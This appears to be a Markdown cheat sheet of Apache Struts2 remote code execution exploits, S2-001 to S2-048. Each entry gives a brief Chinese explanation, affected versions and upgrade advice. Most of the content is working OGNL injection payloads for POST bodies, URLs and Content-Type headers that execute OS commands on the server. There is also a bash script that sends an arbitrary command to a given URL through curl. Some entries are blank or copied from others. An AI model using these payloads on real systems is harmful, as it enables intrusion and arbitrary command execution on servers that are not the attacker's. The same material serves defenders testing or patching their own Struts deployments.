# struts2  remote code execution vulnerability

--

#### S02-001 无回显

> Problem:
> 
> 该漏洞其实是因为用户提交表单数据并且验证失败时，后端会将用户之前提交的参数值使用 OGNL 表达式 %{value} 进行解析，然后重新填充到对应的表单数据中。例如注册或登录页面，提交失败后端一般会默认返回之前提交的数据，由于后端使用 %{value} 对提交的数据执行了一次 OGNL 表达式解析，所以可以直接构造 Payload 进行命令执行
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.0.8
> 
> Solution:
> 
> Upgrade to Apache Struts version 

###### POST POC

```
%{@java.lang.Runtime@getRuntime().exec("whoami")}
```

---

#### S02-002



---

#### S02-003

> Problem:
> 
> S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。
> 
> S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.1.8.1
> 
> Solution:
> 
> Upgrade to Apache Struts version 2.2.1

---

#### S02-005

> Problem:
> 
> S2-005是由于官方在修补S2-003不全面导致绕过补丁造成的。我们都知道访问Ognl的上下文对象必须要使用#符号，S2-003对#号进行过滤，但是没有考虑到unicode编码情况，导致\u0023或者8进制\43绕过。
> 
> S2-005则是绕过官方的安全配置（禁止静态方法调用和类方法执行），再次造成漏洞。
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.1.8.1
> 
> Solution:
> 
> Upgrade to Apache Struts version 2.2.1

###### POST POC

```
('\43_memberAccess.allowStaticMethodAccess')(a)=true&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(b))&('\43c')(('\43_memberAccess.excludeProperties\75@java.util.Collections@EMPTY_SET')(c))&(g)(('\43mycmd\75\'whoami\'')(d))&(h)(('\43myret\75@java.lang.Runtime@getRuntime().exec(\43mycmd)')(d))&(i)(('\43mydat\75new\40java.io.DataInputStream(\43myret.getInputStream())')(d))&(j)(('\43myres\75new\40byte[51020]')(d))&(k)(('\43mydat.readFully(\43myres)')(d))&(l)(('\43mystr\75new\40java.lang.String(\43myres)')(d))&(m)(('\43myout\75@org.apache.struts2.ServletActionContext@getResponse()')(d))&(n)(('\43myout.getWriter().println(\43mystr)')(d))
```

---

#### S02-007

> Problem:
> 
> 当配置了验证规则 <ActionName>-validation.xml 时，若类型验证转换出错，后端默认会将用户提交的表单值通过字符串拼接，然后执行一次 OGNL 表达式解析并返回
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.2.3
> 
> Solution:
> 
> Upgrade to Apache Struts version 

###### POST POC

```
' + (#_memberAccess["allowStaticMethodAccess"]=true,#foo=new java.lang.Boolean("false") ,#context["xwork.MethodAccessor.denyMethodExecution"]=#foo,@java.lang.Runtime@getRuntime().exec("whoami")) + '
```

---

#### S02-008 无回显

> Problem:
> 
> S2-008 涉及多个漏洞，Cookie 拦截器错误配置可造成 OGNL 表达式执行，但是由于大多 Web 容器（如 Tomcat）对 Cookie 名称都有字符限制，一些关键字符无法使用使得这个点显得比较鸡肋。另一个比较鸡肋的点就是在 struts2 应用开启 devMode 模式后会有多个调试接口能够直接查看对象信息或直接执行命令，正如 kxlzx 所提这种情况在生产环境中几乎不可能存在，因此就变得很鸡肋的，但我认为也不是绝对的，万一被黑了专门丢了一个开启了 debug 模式的应用到服务器上作为后门也是有可能的。
> 
> Affected Software: 
> 
> Struts 2.1.0 - Struts 2.3.1
> 
> Solution:
> 
> Upgrade to Apache Struts version 

###### URI POC

```
?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29)
```

---

#### S02-009

> Problem:
> 
> 
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.1.1
> 
> Solution:
> 
> Upgrade to Apache Struts version 2.3.1.2

###### POST POC

```
class.classLoader.jarPath=%28%23context["xwork.MethodAccessor.denyMethodExecution"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess["allowStaticMethodAccess"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]
```

---

#### S02-012 无回显

> Problem:
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.31
> 
> Solution:
> 
> Upgrade to Apache Struts version 

###### POST POC

```
?name=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29%29%7D
```

---

#### S02-013 | S02-014 无回显

> Problem:
> 
> Struts2 标签中 <s:a> 和 <s:url> 都包含一个 includeParams 属性，其值可设置为 none，get 或 all，参考官方其对应意义如下：
> 
> ```
> none - 链接不包含请求的任意参数值（默认）
> get - 链接只包含 GET 请求中的参数和其值
> all - 链接包含 GET 和 POST 所有参数和其值
> ```
> 
> 若设置了 includeParams="get" 或者 includeParams="all"，在获取对应类型参数时后端会对参数值进行 OGNL 表达式解析，因此可以插入任意 OGNL 表达式导致命令执行
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.14 (2.3.14.1)
> 
> Solution:
> 

###### POST POC

```
a=1${(%23_memberAccess["allowStaticMethodAccess"]=true,%23a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),%23b=new+java.io.InputStreamReader(%23a),%23c=new+java.io.BufferedReader(%23b),%23d=new+char[50000],%23c.read(%23d),%23sbtest=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),%23sbtest.println(%23d),%23sbtest.close())}
```

###### URI POC

```
?Vulnerability=%25%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22whoami%22%29%29%7D
```

---

#### S02-015 无回显 命令不能包含 / \ " 三种特殊符号

> Problem:
> 
> 漏洞产生于配置了 Action 通配符 *，并将其作为动态值时，解析时会将其内容执行 OGNL 表达式，例如：
> 
> ```
> <package name="S2-015" extends="struts-default">
>     <action name="*" class="com.demo.action.PageAction">
>         <result>/{1}.jsp</result>
>     </action>
> </package>
> ```
> 上述配置能让我们访问 name.action 时使用 name.jsp 来渲染页面，但是在提取 name 并解析时，对其执行了 OGNL 表达式解析，所以导致命令执行。在实践复现的时候发现，由于 name 值的位置比较特殊，一些特殊的字符如 / " \ 都无法使用（转义也不行），所以在利用该点进行远程命令执行时一些带有路径的命令可能无法执行成功。
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.14.2
> 
> Solution:
> 
> 

```
/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberAccess,true),@java.lang.Runtime@getRuntime().exec('whoami')}.action
```

---

#### S02-016 无回显

> Problem:
> 
> Struts 2 DefaultActionMapper支持通过前缀“action:”或“重定向:”前缀参数来进行短路导航状态更改的方法，然后是一个期望的导航目标表达式。该机制旨在帮助将导航信息附加到窗体内的按钮上。
> 
> 在Struts 2中，在2.3.15.1之前的“action:”，“redirect:”或“redirectAction:”没有经过适当的消毒。由于该信息将被评估为OGNL在值堆栈上的表达式，因此引入了注入服务器端代码的可能性。
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.15
> 
> Solution:
> 
> 

###### URI POC

```
?redirect:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get('co'+'m.ope'+'nsymph'+'ony.x'+'wor'+'k2.disp'+'atch'+'er.HttpSe'+'rvletRe'+'sponse'),#matt.getWriter().println(new java.lang.String(#e)),#matt.getWriter().flush(),#matt.getWriter().close()}'
```

###### URI POC

```
?redirectAction:%25{(new+java.lang.ProcessBuilder(new+java.lang.String[]{'touch','fileName'})).start()}
```

###### URI POC

```
?redirect:%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23f%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23f.setAccessible%28true%29%2C%23f.set%28%23_memberAccess%2Ctrue%29%2C@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29%7D
```

---

#### S02-019 Debug开发者模式

> Problem:
> 
> 动态方法调用是一种已知的可能存在安全漏洞的机制，但在此之前，它是默认启用的，并警告用户如果可能的话，应该关闭它。
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.15.1
> 
> Solution:
> 
> 关闭debug模式, Developers should immediately Upgrade to Apache Struts version 2.3.15.2

###### POST POC

```
debug=command&expression=#f=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#f.setAccessible(true),#f.set(#_memberAccess,true),#req=@org.apache.struts2.ServletActionContext@getRequest(),#resp=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'whoami'})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[10000],#d.read(#e),#resp.println(#e),#resp.close()
```
---

#### S02-029 无回显

> Problem:
> 
> 当开发者在模版中使用了类似如下的标签写法时，后端 Struts2 处理时会导致二次 OGNL 表达式执行的情况：
> 
> `<s:textfield name="%{message}"></s:textfield>`
> 
> Affected Software: 
> 
> Struts 2.0.0 - Struts 2.3.16
> 
> Solution:
> 

```
?message=(%23_memberAccess['allowPrivateAccess']=true,%23_memberAccess['allowProtectedAccess']=true,%23_memberAccess['excludedPackageNamePatterns']=%23_memberAccess['acceptProperties'],%23_memberAccess['excludedClasses']=%23_memberAccess['acceptProperties'],%23_memberAccess['allowPackageProtectedAccess']=true,%23_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('whoami'))
```

---

#### S02-032 无回显

> Problem:
> 
> 在配置了 Struts2 DMI 为 True 的情况下，可以使用 method:<name> Action 前缀去调用声明为 public 的函数，DMI 的相关使用方法可参考官方介绍（Dynamic Method Invocation），这个 DMI 的调用特性其实一直存在，只不过在低版本中 Strtus2 不会对 name 方法值做 OGNL 计算，而在高版本中会
> 
> Affected Software: 
> 
> Struts 2.3.20 - Struts Struts 2.3.28 (except 2.3.20.3 and 2.3.24.3)
> 
> Solution:
> 
> Disable Dynamic Method Invocation if possible. Alternatively Upgrade to Apache Struts version 2.3.20.3, Struts 2.3.24.3 or Struts 2.3.28.1.

###### URI POC

```
?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=%5C%5CA&ppp=%20&encoding=UTF-8
```

###### URI POC [greaty]

```
?method:%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%2C%23f%3D@java.lang.Runtime@getRuntime%28%29.exec%28%23parameters.cmd%5B0%5D%29%2C%23f.close&cmd=whoami
```

---

#### S02-037

> Problem:
> 
> 在使用REST插件时，以及 Dynamic Method Invocation is enabled.（也就是开启动态方法执行）可以通过恶意表达式在服务器端执行任意代码。
> 
> Affected Software: 
> 
> Struts 2.3.20 - Struts Struts 2.3.28.1
> 
> Solution:
> 
> Upgrade to Apache Struts version 2.3.29

###### URI POC 固定类型地址

```
/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=7556&command=whoami
```

---

#### S02-045 HEAD DATA

> Problem:
> 
> 使用Jakarta插件处理文件上传操作时可能导致远程代码执行漏洞。
> 
> Affected Software: 
> 
> Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
> 
> Solution:
> 
> 1
> 
> 严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。
> 
> 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）
> 
> 一定不要使用如下的方式
> 
> 2
> 
> Upgrade to Apache Struts version 2.3.32 or Struts 2.5.10.1

###### HEAD POC

```
Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

---

#### S02-046

> Problem:
> 
> 上传文件的大小（由Content-Length头指定）大于Struts2允许的最大大小（2GB）。
> 
> header中的Content-Disposition中包含空字节。
> 
> 文件名内容构造恶意的OGNL内容。
> 
> Affected Software: 
> 
> Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10
> 
> Solution:
> 
> 1
> 
> 严格过滤 Content-Type 、filename里的内容，严禁ognl表达式相关字段。
> 
> 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）
> 
> 一定不要使用如下的方式
> 
> 2
> 
> Upgrade to Apache Struts version or Struts 2.5.10.1

###### PYTHON POC

```
POST /doUpload.action HTTP/1.1
Host: localhost:8080
Content-Length: 10000000
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAnmUgTEhFhOZpr9z
Connection: close
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test','Kaboom')}"
Content-Type: text/plain
Kaboom 
 
------WebKitFormBoundaryAnmUgTEhFhOZpr9z--
```

###### BASH POC

```
#!/bin/bash
 
url=$1
cmd=$2
shift
shift
 
boundary="---------------------------735323031399963166993862150"
content_type="multipart/form-data; boundary=$boundary"
payload=$(echo "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"$cmd"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}")
 
printf -- "--$boundary\r\nContent-Disposition: form-data; name=\"foo\"; filename=\"%s\0b\"\r\nContent-Type: text/plain\r\n\r\nx\r\n--$boundary--\r\n\r\n" "$payload" | curl "$url" -H "Content-Type: $content_type" -H "Expect: " -H "Connection: close" --data-binary @- $@
```

---

#### S02-048

> Problem:
> 
> 在Struts 2.3.X系列的Showcase插件中演示Struts2整合Struts 1的插件中存在一处任意代码执行漏洞。当你的Web应用使用了Struts 2 Struts 1插件, 则可能导致Struts2执行由外部输入的恶意攻击代码。
> 
> Affected Software: 
> 
> Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本。
> 
> Solution:
> 
> 1
> 
> 开发者通过使用resource keys替代将原始消息直接传递给ActionMessage的方式。
> 
> 如下所示
> 
> `messages.add("msg", new ActionMessage("struts1.gangsterAdded", gform.getName()))`
> 
> 一定不要使用如下的方式
> 
> `messages.add("msg", new ActionMessage("Gangster " + gform.getName() + " was added"))`
> 
> 2
> 
> Upgrade to Apache Struts version 2.5.10.1

###### 1 POST POC

```
name=${(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=newjava.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

###### 2 POST POC [Greaty] 固定类型地址

```
name=${(#dm=@\u006Fgnl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess=#dm).(#ef='whoami').(#iswin=(@\u006Aava.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#efe=(#iswin?{'cmd.exe','/c',#ef}:{'/bin/bash','-c',#ef})).(#p=new \u006Aava.lang.ProcessBuilder(#efe)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&age=1&__checkbox_bustedBefore=true&description=2
```

###### 3 HEAD POC [UNKONW]

```
Content-Type: %{(#szgx='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())}
```
---
